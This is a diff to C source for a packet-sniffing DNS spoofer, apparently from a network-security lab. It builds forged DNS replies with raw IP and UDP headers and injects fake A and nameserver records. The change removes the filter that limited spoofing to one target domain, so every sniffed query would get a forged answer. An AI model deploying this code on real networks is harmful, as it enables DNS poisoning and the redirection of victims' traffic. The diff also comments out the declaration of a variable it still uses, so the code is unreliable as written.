@@ -41,7 +41,7 @@ int main()
   bpf_u_int32 net; 
 
   //Open live pcap session on NIC with name eth0
-  handle = pcap_open_live("eth14", BUFSIZ, 1, 1000, errbuf);	  
+  handle = pcap_open_live("eth0", BUFSIZ, 1, 1000, errbuf);	  
   printf("handle is %p\n",handle);
   printf("errbuf is %s\n",errbuf);
   
@@ -72,7 +72,7 @@ void spoof_DNS_reply(struct ipheader* ip)
     newip->iph_sourceip = ip->iph_destip;
     newip->iph_destip = ip->iph_sourceip;
     newip->iph_ttl = 20;
-    newip->iph_protocol = UDP_PROTOCOL; 
+    newip->iph_protocol = IPPROTO_UDP; 
 
     
 
@@ -82,10 +82,12 @@ void spoof_DNS_reply(struct ipheader* ip)
     newudp->udp_sport = udp->udp_dport;
     newudp->udp_dport = udp->udp_sport;
 
+
     //DNS bit here
-    int udp_header_len = ip->iph_ihl * 4;
+    //int udp_header_len = ip->iph_ihl * 4;
+    
     struct dnsheader* dns = (struct dnsheader *) ((u_char *)udp + udp_header_len);
-    unsigned short dnsLength = construct_dns_reply(buffer);
+    unsigned short dnsLength = construct_dns_reply(buffer + sizeof(struct ipheader) + sizeof(struct udpheader));
 
     send_raw_ip_packet(newip);
 }
@@ -119,16 +121,16 @@ unsigned short construct_dns_reply(char *buffer)
 
 	char *p = buffer + 12; // move the pointer to the beginning of DNS data
 
-	if(strstr(p, TARGET_DOMAIN) == NULL){
+	/*if(strstr(p, TARGET_DOMAIN) == NULL){
 		return 0;		//only target one specific domain
-	}
+	}*/
 
 	p += strlen(p) + 1 + 2 + 2; //Skip the Question section (no change)
 
 	p += set_A_record(p, NULL, 0x0C, ANSWER_IPADDR); //Add an A record (Answer section)
 	p += set_NS_record(p, TARGET_DOMAIN, 0, NS_SERVER); //Add an NS record (Authority section)
 	p += set_A_record(p, NS_SERVER, 0, NS_IPADDR); //Add an A record (Additional section)
-
+	//printf("dns Length is %i",(p - buffer));
 	return p - buffer;
 }
 
@@ -163,7 +165,7 @@ unsigned short set_A_record(char *buffer, char *name, char offset, char *ip_addr
 
 	((struct in_addr *)p)->s_addr = inet_addr(ip_addr); //IP address
 	p += 4;
-
+	//printf("A record is %i", \n, );
 	return (p-buffer);
 
 }
